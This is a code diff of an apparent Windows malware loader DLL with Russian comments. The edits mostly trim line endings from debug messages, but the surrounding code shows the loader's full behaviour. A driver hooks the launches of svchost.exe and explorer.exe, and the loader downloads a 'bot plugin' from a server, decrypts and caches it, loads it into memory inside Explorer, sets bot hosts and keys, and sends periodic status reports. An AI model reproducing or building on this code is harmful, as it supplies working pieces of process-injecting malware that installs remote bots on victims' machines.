@@ -26,12 +26,12 @@ namespace LDRDEBGTEMPLATES
 
 void DbgRptSvchostThread(void* Arguments)
 {
-	LDRDBG("DbgRptSvchostThread", "Sleeping before network started (3 min)...\r\n");
+	LDRDBG("DbgRptSvchostThread", "Sleeping before network started (3 min)...");
 	pSleep(3 * 60 * 1000);
 
 	for(;;)
 	{
-		LDRDBG("DbgRptSvchostThread", "Notify debug report...\r\n");
+		LDRDBG("DbgRptSvchostThread", "Notify debug report...");
 
 		// 304_ld постоянная работа в Svchost (каждые 3 минуты)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("304_ld"));
@@ -44,7 +44,7 @@ void DbgRptExplorerThread(void* Arguments)
 {
 	for(;;)
 	{
-		LDRDBG("DbgRptExplorerThread", "Notify debug report...\r\n");
+		LDRDBG("DbgRptExplorerThread", "Notify debug report...");
 
 		// 305_ld постоянная работа в Explorer (каждые 3 минуты)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("305_ld"));
@@ -138,7 +138,7 @@ namespace DLLLoader
 		// Функция загрузки плагина
 		PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
 		
-		LDRDBG("BRDS", "Отключаем слежение за процессом svchost.exe \r\n");
+		LDRDBG("BRDS", "Отключаем слежение за процессом svchost.exe ");
 
 		DriverRemoveInjectToProcess(InitData, SVChostName);
 
@@ -155,14 +155,14 @@ namespace DLLLoader
 		}
 		
 		
-		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 10) \r\n");
+		LDRDBG("BRDS", "Запуск загрузки плагина бота (V 10) ");
 
 		DWORD Size = 0;
 		LPVOID Module = NULL;
 
 
 		//Загружаем библиотеку
-		LDRDBG("BRDS", "Инициализируем загрузку плагина!\r\n");
+		LDRDBG("BRDS", "Инициализируем загрузку плагина!");
 
 		// 311_ld начало загрузки файла плага с сервера в svchost
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("311_ld"));
@@ -170,7 +170,7 @@ namespace DLLLoader
 
 		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
 
-		LDRDBG("BRDS", "DownloadEx result module=0x%u\r\n", Module);
+		LDRDBG("BRDS", "DownloadEx result module=0x%u", Module);
 
 		// 312_ld окончание загрузки файла плага с сервера в svchost
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("312_ld"));
@@ -178,14 +178,14 @@ namespace DLLLoader
 		if (Module != NULL)
 		{
 			// Сохраняем данные в кэш
-			LDRDBG("BRDS", "Бот успешно загружен \r\n");
+			LDRDBG("BRDS", "Бот успешно загружен ");
 			MemFree(Module);
 
 			// передаем прочитанную длл в драйвер	
 			// добавляем модуль для инжекта в процесс диспетчера задач
 
 			// Уведомляем експлорер об успешной загрузке длл
-			LDRDBG("BRDS", "Уведомляем эксплорер \r\n");
+			LDRDBG("BRDS", "Уведомляем эксплорер ");
 
 			// 313_ld успешная загрузка файла плага с сервера в svchost
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("313_ld"));
@@ -199,7 +199,7 @@ namespace DLLLoader
 
 		ThreadHandle = NULL; // Идентификатор потока нас больше не интересует
 
-		LDRDBG("BRDS", "DownloadMethod finised.\r\n");
+		LDRDBG("BRDS", "DownloadMethod finised.");
 
 		return 0;
 	}
@@ -306,7 +306,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 
 	if (Module == NULL)
 	{
-		LDRDBG("BRDS Explorer", "Не удалось загрузить длл в память \r\n");
+		LDRDBG("BRDS Explorer", "Не удалось загрузить длл в память ");
 		return;
 	}
 
@@ -316,7 +316,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 	if (SetParamMethod != NULL)
 	{
 		// Устанавливаем параметры бота
-		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота \r\n");
+		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота ");
 		SetParam(BOT_PARAM_PREFIX);
 		SetParam(BOT_PARAM_HOSTS);
 		SetParam(BOT_PARAM_KEY);
@@ -329,7 +329,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 
 	if (Method != NULL)
 	{
-		LDRDBG("BRDS Explorer", "Бот успешно запущен \r\n");
+		LDRDBG("BRDS Explorer", "Бот успешно запущен ");
 		DLLLoader::DLLLoadedInExplorer = true;
 		Method(NULL, NULL, NULL);
 
@@ -342,7 +342,7 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 
 bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 {
-	LDRDBG("BRDS Explorer", "Запускаем длл бота \r\n");
+	LDRDBG("BRDS Explorer", "Запускаем длл бота ");
 
 	// 310_ld попытка получить файл плага с кеша в Explorer
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("310_ld"));
@@ -355,7 +355,7 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 		return true;
 
 
-	LDRDBG("BRDS Explorer", "Читаем плагин из кэша \r\n");
+	LDRDBG("BRDS Explorer", "Читаем плагин из кэша ");
 	DWORD Size = 0;
 	LPBYTE Module = Plugin::DownloadFromCache(BotPlugin, true, NULL, &Size);
 
@@ -365,7 +365,7 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 		if (DelayBeforeStart != 0)
 		pSleep(DelayBeforeStart);
 
-		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована \r\n");
+		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована ");
 		ExplorerLoadDLL(InitData, Module, Size);
 
 		MemFree(Module);
@@ -386,11 +386,11 @@ VOID WINAPI StartBotDll(LPVOID Reserved, PBUFFER_DATA Data, LPVOID lParam)
 
 DWORD WINAPI ExplorerStartProc(LPVOID Data)
 {
-	LDRDBG("BRDS", "Зупущена функция Эксплорера  \r\n");
+	LDRDBG("BRDS", "Зупущена функция Эксплорера  ");
 
 	if (Data == NULL) 
 	{
-		LDRDBG("BRDS Explorer", "Ошибочные данные для работы в эксплорере \r\n");
+		LDRDBG("BRDS Explorer", "Ошибочные данные для работы в эксплорере ");
 		return 0;
 	}
 
@@ -402,25 +402,25 @@ DWORD WINAPI ExplorerStartProc(LPVOID Data)
 
 	PUSER_INIT_NOTIFY InitData = (PUSER_INIT_NOTIFY)Data;
 
-	LDRDBG("BRDS Explorer", "Ожидаем пока драйвер отключит слежение за процессоь svchost.exe \r\n");
+	LDRDBG("BRDS Explorer", "Ожидаем пока драйвер отключит слежение за процессоь svchost.exe ");
 	while (CheckIsInjectToProcess(InitData, SVChostName)) pSleep(300);
 
 
-	LDRDBG("BRDS Explorer", "Запуск потока Эксплорера \r\n");
+	LDRDBG("BRDS Explorer", "Запуск потока Эксплорера ");
 
 	// Первым делом пытаемся запустить длл из файла
 	
 	if (DoStartBotDll(InitData, 5000))
 	{	
-		LDRDBG("BRDS Explorer", "Бот успешно загружен из кэша \r\n");
+		LDRDBG("BRDS Explorer", "Бот успешно загружен из кэша ");
 		return 0;
 	} 
 
 	// Регистрируем событие обратной связи
-	LDRDBG("BRDS Explorer", "Регистрируем метод обратной связи в процессе Explorer \r\n");
+	LDRDBG("BRDS Explorer", "Регистрируем метод обратной связи в процессе Explorer ");
 	if (!DriverRegisterGlobalCallback(InitData, (DWORD)pGetCurrentThreadId(), StartBotDll, NULL))
 	{
-		LDRDBG("BRDS Explorer", "Ошибка регистрации метода обратной свзи експлорера \r\n");
+		LDRDBG("BRDS Explorer", "Ошибка регистрации метода обратной свзи експлорера ");
 		return 0;
 	}
 
@@ -454,7 +454,7 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 
 	DWORD Hash = STR::GetHash(ShortName, 0, true);
 
-	LDRDBG("BRDS", "LoaderDll loaded ...\r\n");
+	LDRDBG("BRDS", "LoaderDll loaded ...");
 
 	//// 301_ld запуск вообще (тут сети может не быть)
 	//PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("301_ld"));
@@ -464,8 +464,8 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 
 		PCHAR CL = (PCHAR)pGetCommandLineA();
 
-		LDRDBG("BRDS", "Драйвер перехватил запуск процесса svchost.exe \r\n");
-		LDRDBG("BRDS", "Командная строка svchost.exe - %s \r\n", CL);
+		LDRDBG("BRDS", "Драйвер перехватил запуск процесса svchost.exe ");
+		LDRDBG("BRDS", "Командная строка svchost.exe - %s ", CL);
 
 		//if (STR::Pos(CL, "localservice", 0, false) >= 0)
 		{
@@ -475,7 +475,7 @@ extern"C" __declspec(dllexport) VOID NTAPI  Start(
 	if (Hash == 0x490A0972 /* explorer.exe */)
 	{
 		// 
-		LDRDBG("BRDS", "Драйвер перехватил запуск эксплорера \r\n");
+		LDRDBG("BRDS", "Драйвер перехватил запуск эксплорера ");
 		StartThread(ExplorerStartProc, SystemArgument1);
 	}
 };
@@ -486,14 +486,14 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		LPVOID Module = NULL;
 
 		//Загружаем библиотеку
-		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!\r\n");
+		LDRDBG("LoadPlugToCache", "Начинаем загрузку плагина!");
 
 		// 315_ld начало загрузки файла плага методом LoadPlugToCache
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("315_ld"));
 
 		Module = Plugin::DownloadEx(BotPlugin, NULL, &Size, true, true, NULL);
 
-		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u\r\n", Module);
+		LDRDBG("LoadPlugToCache", "DownloadEx result module=0x%u", Module);
 
 		// 316_ld окончание загрузки файла плага методом LoadPlugToCache
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("316_ld"));
@@ -501,7 +501,7 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		if (Module != NULL)
 		{
 			// Сохраняем данные в кэш
-			LDRDBG("LoadPlugToCache", "Module successfuly loaded.\r\n");
+			LDRDBG("LoadPlugToCache", "Module successfuly loaded.");
 			
 			// 317_ld успешная загрузка файла плага методом LoadPlugToCache
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
@@ -517,6 +517,8 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 
 DWORD WINAPI LoaderDllMain(DWORD, DWORD, DWORD)
 {
+	// В дропере загрузчик Дллки в память проверяет 
+	// возвращаемое значение. Поэтому ставим возвращать TRUE
 	//return 0;
 	return TRUE;
 }
